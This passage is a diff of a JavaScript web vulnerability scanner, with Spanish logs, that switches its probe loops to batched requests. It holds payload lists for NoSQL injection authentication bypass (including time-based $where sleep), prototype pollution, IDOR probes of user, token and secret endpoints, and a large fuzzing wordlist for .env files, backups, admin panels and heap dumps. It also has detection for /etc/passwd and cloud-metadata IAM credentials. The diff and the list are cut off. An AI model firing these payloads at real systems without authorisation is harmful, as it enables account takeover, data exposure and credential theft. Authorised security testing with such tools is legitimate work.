 var nosqlTests=[target+'?id[$ne]=1',target+"?username[$regex]=.*\u0026password[$regex]=.*",target+'?q={"$gt":""}',target+'?id[$gt]=0',target+'?name[$regex]=admin',target+'?id[$ne]=null',target+'?id[$exists]=true',target+'?id[$type]=string',target+'?id[$mod]=[10,1]',target+'?id[$where]=1==1',target+'?id[$in]=[1,2,3]',target+'?id[$nin]=[1]',target+"?username[$eq]=admin\u0026password[$eq]=admin",target+"?username[$ne]=null\u0026password[$ne]=null",target+'?q={"$where":"1==1"}',target+'?q={"$regex":".*"}',target+'?q={"$gt":null}',target+'?data={"user":"admin","pass":{"$ne":""}}',target+'?data={"username":"admin","password":{"$gt":""}}',target+'?q={"$or":[{"user":"admin"},{"user":"root"}]}',target+'?q={"$where":"sleep(3000)"}',target+"?id[$regex]=.*\u0026password[$regex]=.*",target+"?username[$gt]=admin\u0026password[$gt]=admin",target+'?id[$lt]=999999',target+'?id[$lte]=0',target+'?id[$gte]=0',target+'?id[$exists]=false',target+'?id[$type]=int',target+'?id[$mod]=[0,0]',target+'?id[$size]=1',target+'?id[$all]=[1,2,3]',target+'?id[$elemMatch]={$gt:0}',target+'?id[$not]={$gt:0}',target+'?id[$nor]=[{id:1}]',target+'?data={"$where":"1==1","$orderby":{"username":1}}',target+'?data={"username":{"$ne":"guest"},"password":{"$ne":"guest"}}',target+'?data={"email":{"$regex":"admin.*"}}',target+'?data={"username":{"$regex":"^admin"},"password":{"$ne":""}}',target+'?data={"$expr":{"$eq":["$username","admin"]}}',target+'?data={"$where":"this.username == \'admin\'"}',target+'?data={"username":{"$ne":"a"},"password":{"$ne":"a"}}'];
 var nosqlBase=await get(target+'?id=1');var nosqlBaseBody=nosqlBase.body||'';var nosqlBaseLen=nosqlBaseBody.length;
 var nosqlErrRe=/MongoError|MongoServerError|BSON|mongoose|MongooseError|MongoBulkWriteError|driverConnection|topology was destroyed|pool destroyed/i;
-for(var ni=0;ni<nosqlTests.length;ni++){var rn=await get(nosqlTests[ni]);
+var nosqlResArr=await smartBatch(nosqlTests);
+for(var ni=0;ni<nosqlTests.length;ni++){var rn=(nosqlResArr[ni]&&nosqlResArr[ni].status==='fulfilled'&&nosqlResArr[ni].value)?nosqlResArr[ni].value:{ok:false,body:''};
 if(rn.ok&&rn.body){
 if(nosqlErrRe.test(rn.body)&&!nosqlErrRe.test(nosqlBaseBody)&&rn.body.indexOf('$ne')===-1&&rn.body.indexOf('$regex')===-1){logErr('NoSQLi: '+nosqlTests[ni].split('?')[1]+' — error MongoDB especifico');addF('high','NoSQL Injection','Error MongoDB visible');markCrit('p25');break;}
 if(rn.body.indexOf('_id')>-1&&rn.body.indexOf('ObjectId')>-1&&nosqlBaseBody.indexOf('ObjectId')===-1){logErr("NoSQLi: documentos _id\u002fObjectId expuestos");addF('high','NoSQL Injection','Documentos MongoDB expuestos');markCrit('p25');break;}
-if(rn.body.length>nosqlBaseLen+500&&rn.body.indexOf('$ne')===-1&&rn.body.indexOf('$regex')===-1&&nosqlTests[ni].indexOf('password')>-1){logErr('NoSQLi: respuesta +500 bytes con datos de auth — bypass posible');addF('high','NoSQL Injection','Bypass de auth via operador MongoDB');markCrit('p25');break;}}
-await sl(15);}
+if(rn.body.length>nosqlBaseLen+500&&rn.body.indexOf('$ne')===-1&&rn.body.indexOf('$regex')===-1&&nosqlTests[ni].indexOf('password')>-1){logErr('NoSQLi: respuesta +500 bytes con datos de auth — bypass posible');addF('high','NoSQL Injection','Bypass de auth via operador MongoDB');markCrit('p25');break;}}}
 logOk('NoSQLi basico probado');
 /* NoSQLi blind time-based */
 logInfo('NoSQLi: probando blind time-based...');
@@ -28098,7 +28727,8 @@ if(nosqlTime>4000){logErr('NoSQLi BLIND TIME-BASED: respuesta tardo '+nosqlTime+
 else logOk('NoSQLi blind time-based: sin retardo detectable ('+nosqlTime+'ms)');
 /* NoSQLi JSON body injection */
 var nosqlJsonTests=[target+'?data={"username":"admin","password":{"$gt":""}}',target+'?data={"username":{"$ne":null},"password":{"$ne":null}}',target+'?data={"email":{"$regex":".*"},"password":{"$regex":".*"}}',target+'?data={"$or":[{"username":"admin"},{"username":"root"}],"password":{"$ne":""}}',target+'?data={"username":"admin","password":{"$regex":"^.*$"}}',target+'?data={"username":{"$exists":true},"password":{"$exists":true}}',target+'?data={"role":{"$ne":"user"},"token":{"$ne":""}}',target+'?data={"admin":true,"password":{"$ne":""}}',target+'?data={"$where":"this.password != \'\' || this.username == \'admin\'"}',target+"?data={\"username\":\"admin\",\"password\":{\"$func\":\"this.password.match(\u002f.*\u002f)\"}},",target+'?data={"__proto__":{"isAdmin":true}}',target+'?data={"constructor":{"prototype":{"role":"admin"}}}'];
-for(var nj=0;nj<nosqlJsonTests.length;nj++){var rnJ=await get(nosqlJsonTests[nj]);
+var nosqlJArr=await smartBatch(nosqlJsonTests);
+for(var nj=0;nj<nosqlJsonTests.length;nj++){var rnJ=(nosqlJArr[nj]&&nosqlJArr[nj].status==='fulfilled'&&nosqlJArr[nj].value)?nosqlJArr[nj].value:{ok:false,body:''};
 if(rnJ.ok&&rnJ.body&&rnJ.body.length>nosqlBaseLen+500&&rnJ.body.indexOf('$ne')===-1&&rnJ.body.indexOf('$regex')===-1){logErr('NoSQLi JSON: respuesta ampliada con operador — bypass auth posible');addF('high','NoSQLi via JSON body','Bypass de autenticacion via JSON MongoDB');markCrit('p25');break;}
 if(rnJ.ok&&rnJ.body&&/ObjectId|_id|MongoDB|mongoose/i.test(rnJ.body)&&!/ObjectId|_id|MongoDB|mongoose/i.test(nosqlBaseBody)){logErr('NoSQLi JSON: documentos MongoDB expuestos');addF('high','NoSQLi JSON leak','Documentos MongoDB en respuesta');markCrit('p25');break;}}
 logOk('NoSQLi completo');
@@ -28108,7 +28738,8 @@ logOk('NoSQLi completo');
 await tp(25);logSep('F26 — Prototype Pollution');
 var ppTests=[target+'?__proto__[test]=1',target+'?constructor[prototype][test]=1',target+'?__proto__.polluted=true',target+'?[__proto__][isAdmin]=true',target+"?[__proto__][isAdmin]=true\u0026[__proto__][role]=admin",target+'?constructor.prototype.test=1',target+'?[constructor][prototype][polluted]=true',target+'?__proto__.toStringpolluted=true',target+'?__proto__[__proto__][polluted]=true',target+'?__proto__[constructor]=true',target+'?[prototype][polluted]=true',target+'?__proto__[0]=polluted',target+'?__proto__[length]=999',target+'?__proto__[source]=x',target+'?__proto__[valueOf]=true',target+'?__proto__[toString]=x',target+'?constructor.prototype.toString.polluted=true',target+"?__proto__.isAdmin=true\u0026__proto__.role=admin\u0026__proto__.userId=1",target+'?{"__proto__":{"polluted":"true"}}',target+'?{"constructor":{"prototype":{"polluted":"true"}}}',target+'?data[__proto__][admin]=1',target+'?json[__proto__][isAdmin]=true',target+'?body[__proto__][polluted]=true',target+'?payload[__proto__][role]=admin'];
 var ppBase=await get(target);var ppBaseBody=ppBase.body||'';var ppFound=0;
-for(var ppi=0;ppi<ppTests.length;ppi++){var rpp=await get(ppTests[ppi]);
+var ppResArr=await smartBatch(ppTests);
+for(var ppi=0;ppi<ppTests.length;ppi++){var rpp=(ppResArr[ppi]&&ppResArr[ppi].status==='fulfilled'&&ppResArr[ppi].value)?ppResArr[ppi].value:{ok:false,body:''};
 if(rpp.ok&&rpp.body&&ppBaseBody&&(/polluted|isAdmin.*true/i.test(rpp.body)&&!/polluted|isAdmin.*true/i.test(ppBaseBody))){logErr('Prototype Pollution: '+ppTests[ppi].split('?')[1]);addF('high','Prototype Pollution','Object prototype contaminado via '+ppTests[ppi].split('?')[1]);markCrit('p26');ppFound++;break;}
 if(rpp.ok&&rpp.body&&rpp.body.indexOf('[object Object]')>-1&&ppBaseBody.indexOf('[object Object]')===-1&&/__proto__|constructor|prototype/.test(ppTests[ppi])){logWarn('Prototype Pollution posible: respuesta cambio despues de inyectar proto');addF('med','Prototype Pollution posible','Respuesta alterada por payload __proto__');markCrit('p26');ppFound++;break;}}
 if(ppFound===0)logOk('No se detecto prototype pollution');
@@ -28136,9 +28767,10 @@ logOk('Race condition probado ('+raceOk+"\u002f10 OK)");
 await tp(28);logSep("F29 — API Abuse \u002f IDOR");
 var idorTests=[target+"\u002fapi\u002fv1\u002fusers\u002f1",target+"\u002fapi\u002fv1\u002fusers\u002f2",target+"\u002fapi\u002fv1\u002fusers\u002fadmin",target+"\u002fapi\u002fusers\u002f1",target+"\u002fapi\u002faccount\u002f1",target+"\u002fapi\u002fv2\u002forders\u002f1",target+"\u002fapi\u002fv1\u002fproducts\u002f1",target+"\u002fuser\u002f1",target+"\u002faccount\u002f1",target+"\u002fapi\u002fv1\u002fadmin",target+"\u002fapi\u002fv1\u002fusers\u002f1\u002fsettings",target+"\u002fapi\u002fv1\u002fusers\u002f2\u002fsettings",target+"\u002fapi\u002fv1\u002fusers\u002f1\u002fpassword",target+"\u002fapi\u002fv1\u002fusers\u002f1\u002frole",target+"\u002fapi\u002fv1\u002fusers\u002f1\u002femail",target+"\u002fapi\u002fv1\u002fusers\u002f1\u002fsession",target+"\u002fapi\u002fv1\u002fusers\u002f1\u002ftokens",target+"\u002fapi\u002fv1\u002fusers\u002f1\u002fpermissions",target+"\u002fapi\u002fv2\u002fusers\u002f1",target+"\u002fapi\u002fv2\u002fusers\u002f2",target+"\u002fapi\u002fv2\u002fusers\u002fadmin",target+"\u002fapi\u002fv2\u002faccounts\u002f1",target+"\u002fapi\u002fv2\u002forders\u002f1",target+"\u002fapi\u002fusers\u002f1",target+"\u002fapi\u002faccounts\u002f1",target+"\u002fadmin\u002fusers\u002f1",target+"\u002fadmin\u002faccounts\u002f1",target+"\u002fapi\u002fv1\u002forganizations\u002f1",target+"\u002fapi\u002fv1\u002fteams\u002f1",target+"\u002fapi\u002fv1\u002fprojects\u002f1",target+"\u002fapi\u002fv1\u002fdocuments\u002f1",target+"\u002fapi\u002fv1\u002ffiles\u002f1",target+"\u002fapi\u002fv1\u002fmessages\u002f1",target+"\u002fapi\u002fv1\u002fpayments\u002f1",target+"\u002fapi\u002fv1\u002finvoices\u002f1",target+"\u002fapi\u002fv1\u002fcustomers\u002f1",target+"\u002fapi\u002fv1\u002fsettings\u002f1",target+"\u002fapi\u002fv1\u002ftokens\u002f1",target+"\u002fapi\u002fv1\u002fkeys\u002f1",target+"\u002fapi\u002fv1\u002fsecrets\u002f1",target+"\u002fapi\u002fv1\u002fusers\u002f1?role=admin",target+"\u002fuser\u002fprofile?uid=1",target+"\u002fprofile\u002fview?id=1"];
 var baseline29=await soft404Baseline(target);
-for(var ii=0;ii<idorTests.length;ii++){var ri4=await get(idorTests[ii]);
+var idorResArr=await smartBatch(idorTests);
+for(var ii=0;ii<idorTests.length;ii++){var ri4=(idorResArr[ii]&&idorResArr[ii].status==='fulfilled'&&idorResArr[ii].value)?idorResArr[ii].value:{status:0,body:''};
 var idorPath29=idorTests[ii].split(h)[1]||idorTests[ii];
-if(ri4.status===200&&ri4.body.length>50&&sfVerify(idorPath29,ri4,baseline29)){logWarn('Endpoint accesible: '+idorPath29);addF('med','Posible IDOR: '+idorPath29,'Endpoint de API sin auth aparente');}await sl(10);}
+if(ri4.status===200&&ri4.body.length>50&&sfVerify(idorPath29,ri4,baseline29)){logWarn('Endpoint accesible: '+idorPath29);addF('med','Posible IDOR: '+idorPath29,'Endpoint de API sin auth aparente');}}
 logOk('IDOR probado con '+idorTests.length+' endpoints (falsos positivos de soft-404 descartados)');
 
 /* F30: XXE */
@@ -31733,7 +32365,7 @@ for(var hhi=0;hhi<hostPayloads.length;hhi++){try{var rhh=await pfx(target+"\u002
 if(rhh&&rhh.ok){var hhBody=(typeof rhh.body==='string')?rhh.body:'';if(/root:x:|daemon:x:|nobody:x:/i.test(hhBody)){logErr('Host Header RCE: '+hostPayloads[hhi]+" accede a \u002fetc\u002fpasswd!");addF('crit','Host Header→LFI: '+hostPayloads[hhi],'Host header injection permite acceso a archivos internos via SSRF');markCrit('p321');hhF++;break;}
 if(/169\.254\.169\.254|instance-id|ami-id|security-credentials/i.test(hhBody)){logErr('Host Header→Cloud Metadata: '+hostPayloads[hhi]+' accede a metadata cloud!');addF('crit','Host Header→Cloud Metadata','Host header injection accede a 169.254.169.254 — credenciales IAM');markCrit('p321');hhF++;}
 if(/redis-cli|memcache|elasticsearch|kibana|mongodb|jenkins|grafana/i.test(hhBody)){logErr('Host Header→Internal Service: '+hostPayloads[hhi]+' accede a servicio interno!');addF('crit','Host Header→Internal Access: '+hostPayloads[hhi],'Host header injection permite acceso a servicios internos via proxy');markCrit('p321');hhF++;}
-if(evil.com&&hhBody.indexOf(hostPayloads[hhi])>-1){logWarn('Host Header reflejado: '+hostPayloads[hhi]);addF('high','Host Header Reflected: '+hostPayloads[hhi],'Host header se refleja en respuesta — cache poisoning posible');markCrit('p321');hhF++;}}}catch(e){}await sl(15);}
+if(hhBody&&hhBody.indexOf(hostPayloads[hhi])>-1){logWarn('Host Header reflejado: '+hostPayloads[hhi]);addF('high','Host Header Reflected: '+hostPayloads[hhi],'Host header se refleja en respuesta — cache poisoning posible');markCrit('p321');hhF++;}}}catch(e){}await sl(15);}
 if(hhF===0)logOk('Host Header Injection: sin vectores');
 else logErr('Host Header Injection: '+hhF+' vectores criticos!');
 await sl(35);
@@ -32920,7 +33552,7 @@ if(attackPlan.length>0)addF('high','Smart Attack Plan ('+attackPlan.length+' pas
 await sl(35);
 
 /* F999: Fuzzing Supremo — Directorios y Endpoints Comunes */
-await tp(337);logSep("F999 — Fuzzing Supremo (paneles\u002fAPI\u002fauth\u002fdev\u002fuploads\u002fdiagnostico)");
+await tp(349);logSep("F999 — Fuzzing Supremo (paneles\u002fAPI\u002fauth\u002fdev\u002fuploads\u002fdiagnostico)");
 var fuzzWords=["\u002fadmin","\u002fadministrator","\u002fadmin-panel","\u002fadmincp","\u002fadminpanel","\u002fmanage","\u002fmanagement","\u002fmanager","\u002fcontrol","\u002fcontrolpanel","\u002fcpanel","\u002fpanel","\u002fdashboard","\u002fportal","\u002fconsole","\u002fbackend","\u002fbackoffice","\u002fstaff","\u002fmoderator","\u002fsupervisor","\u002froot","\u002fsuperadmin","\u002fwp-admin","\u002fadmin1","\u002fadmin2","\u002fadmin_area","\u002fadm","\u002fsysadmin","\u002flogin","\u002fsignin","\u002fsign-in","\u002flogon","\u002fauth","\u002fauthenticate","\u002foauth","\u002fsso","\u002fsaml","\u002fsignup","\u002fsign-up","\u002fregister","\u002fforgot-password","\u002freset-password","\u002fpassword-reset","\u002flogout","\u002fsignout","\u002fsign-out","\u002f2fa","\u002fmfa","\u002fotp","\u002fverify","\u002fverification","\u002fapi","\u002fapi\u002fv1","\u002fapi\u002fv2","\u002fapi\u002fv3","\u002fgraphql","\u002fgraphiql","\u002frest","\u002frestapi","\u002fapi-docs","\u002fswagger","\u002fswagger-ui","\u002fopenapi","\u002fapi\u002fdocs","\u002fapi\u002fhealth","\u002fapi\u002fstatus","\u002fapi\u002fping","\u002fapi\u002fversion","\u002fapi\u002fusers","\u002fapi\u002fuser","\u002fapi\u002fadmin","\u002fapi\u002fauth","\u002fapi\u002flogin","\u002fapi\u002ftoken","\u002fapi\u002fconfig","\u002fapi\u002finternal","\u002fapi\u002fprivate","\u002fapi\u002fpublic","\u002fapi\u002fdebug","\u002fapi\u002ftest","\u002ftest","\u002ftests","\u002ftesting","\u002fdev","\u002fdevelopment","\u002fstaging","\u002fstage","\u002fdemo","\u002fsandbox","\u002fbeta","\u002falpha","\u002fpreview","\u002fold","\u002fnew","\u002ftemp","\u002ftmp","\u002fdraft","\u002fwip","\u002fpoc","\u002fsample","\u002fexample","\u002fplayground","\u002fexperiment","\u002finternal","\u002fprivate","\u002fhidden","\u002fsecret","\u002fupload","\u002fuploads","\u002ffile","\u002ffiles","\u002ffilemanager","\u002ffile-manager","\u002fdownload","\u002fdownloads","\u002fmedia","\u002fassets","\u002fstatic","\u002fpublic","\u002fstorage","\u002fattachments","\u002fdocuments","\u002fdocs","\u002fexport","\u002fexports","\u002fimport","\u002fimports","\u002ftmp_files","\u002fuser_uploads","\u002fstatus","\u002fhealth","\u002fhealthz","\u002fping","\u002finfo","\u002fversion","\u002fdebug","\u002ftrace","\u002fmetrics","\u002fmonitor","\u002fmonitoring","\u002fdiagnostics","\u002fready","\u002freadyz","\u002flive","\u002flivez","\u002ftest-connection","\u002fphpinfo","\u002finfo.php","\u002ftest.php","\u002fserver-status","\u002fserver-info","\u002f.well-known","\u002fcrossdomain.xml","\u002fclientaccesspolicy.xml","\u002felmah.axd","\u002ftrace.axd","\u002finstall","\u002fsetup","\u002finstaller","\u002fupdate","\u002fupgrade","\u002fmigrate","\u002fmigration","\u002fseed","\u002fseeds","\u002fcli","\u002fshell","\u002fterminal","\u002fwebshell","\u002fcmd","\u002fexec","\u002feval","\u002fajax","\u002fws","\u002fwebsocket","\u002fwp-content\u002fplugins\u002fbricks-builder\u002f","\u002fwp-content\u002fplugins\u002fbricks-builder\u002freadme.txt","\u002fwp-content\u002fplugins\u002felementor\u002f","\u002fwp-content\u002fplugins\u002felementor\u002freadme.txt","\u002fwp-content\u002fplugins\u002felementor-pro\u002f","\u002fwp-content\u002fplugins\u002felementor-pro\u002freadme.txt","\u002fwp-content\u002fplugins\u002fbackup-migration\u002f","\u002fwp-content\u002fplugins\u002fbackup-migration\u002freadme.txt","\u002fwp-content\u002fplugins\u002fwp-gdpr-compliance\u002f","\u002fwp-content\u002fplugins\u002fwp-gdpr-compliance\u002freadme.txt","\u002fwp-content\u002fplugins\u002fwp-automatic\u002f","\u002fwp-content\u002fplugins\u002fwp-automatic\u002freadme.txt","\u002fwp-content\u002fplugins\u002fcontact-form-7\u002f","\u002fwp-content\u002fplugins\u002fcontact-form-7\u002freadme.txt","\u002fwp-content\u002fplugins\u002fwordfence\u002f","\u002fwp-content\u002fplugins\u002fwordfence\u002freadme.txt","\u002fwp-content\u002fplugins\u002fyoast-seo\u002f","\u002fwp-content\u002fplugins\u002fyoast-seo\u002freadme.txt","\u002fwp-content\u002fplugins\u002fwp-super-cache\u002f","\u002fwp-content\u002fplugins\u002fwp-super-cache\u002freadme.txt","\u002fwp-content\u002fplugins\u002fw3-total-cache\u002f","\u002fwp-content\u002fplugins\u002fw3-total-cache\u002freadme.txt","\u002fwp-content\u002fplugins\u002fduplicator\u002f","\u002fwp-content\u002fplugins\u002fduplicator\u002freadme.txt","\u002fwp-content\u002fplugins\u002fupdraftplus\u002f","\u002fwp-content\u002fplugins\u002fupdraftplus\u002freadme.txt","\u002fwp-content\u002fplugins\u002fall-in-one-wp-migration\u002f","\u002fwp-content\u002fplugins\u002fall-in-one-wp-migration\u002freadme.txt","\u002fwp-content\u002fplugins\u002fwpforms\u002f","\u002fwp-content\u002fplugins\u002fwpforms\u002freadme.txt","\u002fwp-content\u002fplugins\u002fninja-forms\u002f","\u002fwp-content\u002fplugins\u002fninja-forms\u002freadme.txt","\u002fwp-content\u002fplugins\u002frevslider\u002f","\u002fwp-content\u002fplugins\u002frevslider\u002freadme.txt","\u002fwp-content\u002fplugins\u002fwp-file-manager\u002f","\u002fwp-content\u002fplugins\u002fwp-file-manager\u002freadme.txt","\u002fwp-content\u002fplugins\u002freally-simple-ssl\u002f","\u002fwp-content\u002fplugins\u002freally-simple-ssl\u002freadme.txt","\u002fwp-content\u002fplugins\u002fwp-mail-smtp\u002f","\u002fwp-content\u002fplugins\u002fwp-mail-smtp\u002freadme.txt","\u002fwp-content\u002fplugins\u002fakismet\u002f","\u002fwp-content\u002fplugins\u002fakismet\u002freadme.txt","\u002fwp-content\u002fplugins\u002fjetpack\u002f","\u002fwp-content\u002fplugins\u002fjetpack\u002freadme.txt","\u002fwp-content\u002fplugins\u002fwoocommerce\u002f","\u002fwp-content\u002fplugins\u002fwoocommerce\u002freadme.txt","\u002fwp-content\u002fplugins\u002fwp-rocket\u002f","\u002fwp-content\u002fplugins\u002fwp-rocket\u002freadme.txt","\u002fwp-content\u002fthemes\u002f","\u002fwp-content\u002fuploads\u002f","\u002fwp-content\u002fdebug.log","\u002fwp-json\u002f","\u002fwp-cron.php","\u002fxmlrpc.php","\u002fadministrator\u002f","\u002fadministrator\u002fmanifests\u002ffiles\u002fjoomla.xml","\u002fcomponents\u002fcom_users\u002f","\u002fcomponents\u002fcom_fields\u002f","\u002fcomponents\u002fcom_content\u002f","\u002fcomponents\u002fcom_media\u002f","\u002flanguage\u002fen-GB\u002fen-GB.xml","\u002ftemplates\u002fsystem\u002f","\u002fmedia\u002fcom_joomlaupdate\u002f","\u002fapi\u002findex.php\u002fv1\u002fusers","\u002fapi\u002findex.php\u002fv1\u002fconfig\u002fapplication","\u002fCHANGELOG.txt","\u002fcore\u002fCHANGELOG.txt","\u002fsites\u002fdefault\u002fsettings.php","\u002fsites\u002fdefault\u002ffiles\u002f","\u002fcore\u002finstall.php","\u002fuser\u002fregister","\u002fuser\u002fpassword","\u002fnode\u002f1\u002fedit","\u002fadmin\u002fconfig\u002fdevelopment\u002flogging","\u002fjsonapi\u002fnode\u002farticle","\u002frest\u002fsession\u002ftoken","\u002fcore\u002fmisc\u002fdrupal.js","\u002fapi\u002fv4","\u002fapi\u002fv5","\u002fapi\u002fbeta","\u002fapi\u002falpha","\u002fapi\u002finternal-only","\u002fapi\u002flegacy","\u002fapi\u002f1.0","\u002fapi\u002f2.0","\u002fapi\u002fgraphql","\u002fapi\u002frpc","\u002fapi\u002fsoap","\u002fapi\u002fwebhooks","\u002fapi\u002fmetrics","\u002fapi\u002fschema","\u002fapi\u002fopenapi.json","\u002fapi\u002fswagger.json","\u002f.well-known\u002fopenapi.json","\u002factuator","\u002factuator\u002fhealth","\u002factuator\u002fenv","\u002factuator\u002fbeans","\u002factuator\u002fmappings","\u002factuator\u002fheapdump","\u002factuator\u002fthreaddump","\u002fprometheus","\u002fgrafana","\u002fkibana","\u002f_cat\u002findices","\u002feureka","\u002fconsul\u002fv1\u002fcatalog\u002fservices","\u002fvault\u002fv1\u002fsys\u002fhealth","\u002fnomad\u002fv1\u002fstatus\u002fleader","\u002frundeck","\u002fjenkins","\u002fjenkins\u002f\u0073cript","\u002fgitlab","\u002f.well-known\u002fsecurity.txt","\u002fmanifest.json","\u002fservice-worker.js","\u002fbackup_1","\u002fsite_1","\u002fbackup_2","\u002fsite_2","\u002fbackup_3","\u002fsite_3","\u002fbackup_old","\u002fsite_old","\u002fbackup_bak","\u002fsite_bak","\u002fbackup_copy","\u002fsite_copy","\u002fbackup_v1","\u002fsite_v1","\u002fbackup_v2","\u002fsite_v2","\u002fbackup_final","\u002fsite_final","\u002fadministrivia","\u002fadminister","\u002fadminarea","\u002fadmin-console","\u002fadmin-login","\u002fsecure\u002fadmin","\u002fprivate\u002fadmin","\u002finternal\u002fadmin","\u002fmanage\u002flogin","\u002fcms","\u002fcms\u002flogin","\u002fpma","\u002fphpmyadmin","\u002fadminer","\u002fadminer.php","\u002fplesk","\u002fdirectadmin","\u002fwebmin","\u002fvirtualmin","\u002fispconfig","\u002fvestacp","\u002fcyberpanel","\u002fajenti","\u002ffroxlor","\u002fsentora","\u002fzpanel","\u002fkloxo","\u002fcentos-webpanel","\u002fcwp","\u002fruncloud","\u002fserver-manager","\u002faccount","\u002fmy-account","\u002fuser-panel","\u002fclient-area","\u002fhelpdesk","\u002fticket","\u002ftickets","\u002fsupport","\u002fknowledge-base","\u002fwiki","\u002fconfluence","\u002fjira","\u002fredmine","\u002fgitea","\u002fgogs","\u002fforgejo","\u002fsourcegraph","\u002fphabricator","\u002fbugzilla","\u002fmantis","\u002ftrac","\u002fidp","\u002fsp","\u002fsaml2","\u002fsaml\u002flogin","\u002fcas","\u002fcas\u002flogin","\u002fopenid","\u002fconnect","\u002frealms","\u002fauth\u002frealms","\u002fauth0","\u002fokta","\u002fonelogin","\u002fpingfederate","\u002fadfs","\u002fntlm","\u002fkerberos","\u002fldap-login","\u002fradius","\u002ftotp","\u002fwebauthn","\u002ffido2","\u002fpasskey","\u002fmagic-link","\u002fsso-callback","\u002foauth\u002fcallback","\u002foauth2\u002fcallback","\u002foauth\u002ftoken","\u002foauth2\u002ftoken","\u002f.well-known\u002fopenid-configuration","\u002f.well-known\u002fjwks.json","\u002f.well-known\u002fwebfinger","\u002fgateway","\u002fapi-gateway","\u002fgraphql-gateway","\u002fbff","\u002fmicroservice","\u002fservice","\u002fservices","\u002fusers-service","\u002fauth-service","\u002fpayment-service","\u002forder-service","\u002fnotification-service","\u002fsearch-service","\u002frecommendation-service","\u002finventory-service","\u002fshipping-service","\u002fapi\u002fv1\u002fgraphql","\u002fgraphql\u002fconsole","\u002fgraphql\u002fplayground","\u002faltair","\u002fapi\u002fbatch","\u002fapi\u002fbulk","\u002fapi\u002fasync","\u002fapi\u002fjobs","\u002fapi\u002fqueue","\u002fapi\u002ftasks","\u002fapi\u002fcron","\u002fapi\u002fwebhook\u002fstripe","\u002fapi\u002fwebhook\u002fgithub","\u002fapi\u002fwebhook\u002fslack","\u002fapi\u002fwebhook\u002fpaypal","\u002fenv","\u002fenvironments","\u002fenv.local","\u002fenv.production","\u002fenv.staging","\u002fenv.testing","\u002fconfig\u002fenv","\u002fsettings\u002fenv","\u002f.env.bak","\u002f.env.old","\u002f.env.swp","\u002fapp.env","\u002fdocker.env","\u002fk8s.env","\u002fsecrets.env","\u002fvault.env","\u002fci.env","\u002fdeploy.env","\u002fproduction","\u002fpreprod","\u002fpre-production","\u002fqa1","\u002fqa2","\u002fuat1","\u002fuat2","\u002fdr","\u002ffailover","\u002fckfinder","\u002ftinymce","\u002ffckeditor","\u002fckeditor","\u002felfinder","\u002fkcfinder","\u002ffilepicker","\u002ffilestack","\u002fuppy","\u002fdropzone","\u002ffine-uploader","\u002fplupload","\u002fuploadify","\u002fmedia-library","\u002fasset-manager","\u002fcontent-manager","\u002fdam","\u002fdigital-asset-manager","\u002fdbadmin","\u002fmysql-admin","\u002fpgadmin","\u002fmongo-express","\u002fredis-commander","\u002frockmongo","\u002frobomongo","\u002fsequel-pro","\u002fdb-console","\u002fh2-console","\u002fsql-console","\u002fsqlite-browser","\u002fcouchdb-fauxton","\u002flogs","\u002flog","\u002ferror_log","\u002faccess_log","\u002fdebug_log","\u002fapp_log","\u002fsystem_log","\u002faudit_log","\u002fevent_log","\u002fcrash_log","\u002fstack_trace","\u002fcore_dump","\u002fheapdump","\u002fthreaddump","\u002fprofiler","\u002fxdebug","\u002fblackfire","\u002ftideways","\u002fnewrelic","\u002fhealthcheck","\u002fhealth-check","\u002f_health","\u002f__health","\u002fstatus.json","\u002fping.json","\u002fup","\u002falive","\u002fheartbeat","\u002fliveness","\u002freadiness","\u002fstartup","\u002f_status","\u002f_ping","\u002fapple-app-site-association","\u002f.well-known\u002fapple-app-site-association","\u002fassetlinks.json","\u002f.well-known\u002fassetlinks.json","\u002fapp-ads.txt","\u002ffirebase-messaging-sw.js","\u002fgoogle-services.json","\u002fGoogleService-Info.plist","\u002fjenkins\u002fapi\u002fjson","\u002fjenkins\u002fasynchPeople","\u002fjenkins\u002fcomputer","\u002fgitlab\u002fapi\u002fv4\u002fprojects","\u002ftravis.yml","\u002fcircleci","\u002f.circleci\u002fconfig.yml","\u002fazure-pipelines.yml","\u002fbitbucket-pipelines.yml","\u002fcodeship","\u002fdrone","\u002fbuildkite","\u002fteamcity","\u002fbamboo","\u002foctopus-deploy","\u002fspinnaker","\u002fargocd","\u002fflux","\u002fapp\u002fetc\u002flocal.xml","\u002fapp\u002fetc\u002fenv.php","\u002fmagento_version","\u002fdownloader","\u002fadmin_","\u002fconfig\u002fsettings.inc.php","\u002fadmin123","\u002fps_shop","\u002fmodules\u002f","\u002fthemes\u002f","\u002findex.php?controller=admin","\u002finstall\u002findex.php","\u002fadmin\u002findex.php?controller=AdminLogin","\u002fcatalog\u002fadmin","\u002fadmin.php?route=common\u002flogin","\u002fsystem\u002fstorage\u002flogs","\u002fapps\u002f","\u002f.well-known\u002fshopify","\u002fcart.js","\u002fproducts.json","\u002fcollections.json","\u002fapp\u002fv1","\u002frelease\u002fv1","\u002fbuild\u002fv1","\u002fapp\u002fv2","\u002frelease\u002fv2","\u002fbuild\u002fv2","\u002fapp\u002fv3","\u002frelease\u002fv3","\u002fbuild\u002fv3","\u002fapp\u002fv4","\u002frelease\u002fv4","\u002fbuild\u002fv4","\u002fapp\u002fv5","\u002frelease\u002fv5","\u002fbuild\u002fv5","\u002fapp\u002f1","\u002frelease\u002f1","\u002fbuild\u002f1","\u002fapp\u002f2","\u002frelease\u002f2","\u002fbuild\u002f2","\u002fapp\u002f3","\u002frelease\u002f3","\u002fbuild\u002f3","\u002fapp\u002fbeta1","\u002frelease\u002fbeta1","\u002fbuild\u002fbeta1","\u002fapp\u002fbeta2","\u002frelease\u002fbeta2","\u002fbuild\u002fbeta2","\u002fapp\u002frc1","\u002frelease\u002frc1","\u002fbuild\u002frc1","\u002fapp\u002frc2","\u002frelease\u002frc2","\u002fbuild\u002frc2","\u002fbackup-2022","\u002farchive-2022","\u002fexport-2022","\u002fbackup-2023","\u002farchive-2023","\u002fexport-2023","\u002fbackup-2024","\u002farchive-2024","\u002fexport-2024","\u002fbackup-2025","\u002farchive-2025","\u002fexport-2025","\u002fstorage\u002flogs\u002flaravel.log","\u002fbootstrap\u002fcache","\u002fvendor\u002fcomposer\u002finstalled.json","\u002fvar\u002flog\u002fdev.log","\u002fvar\u002flog\u002fprod.log","\u002fpublic\u002fbundles","\u002fapp\u002fconfig\u002fparameters.yml","\u002fconfig\u002fdatabase.yml.bak","\u002fconfig\u002fsecrets.yml.bak","\u002ftmp\u002fcache","\u002flog\u002fproduction.log","\u002flog\u002fdevelopment.log","\u002f__pycache__","\u002frequirements.txt","\u002fmanage.py","\u002fwsgi.py","\u002fasgi.py","\u002fcelery.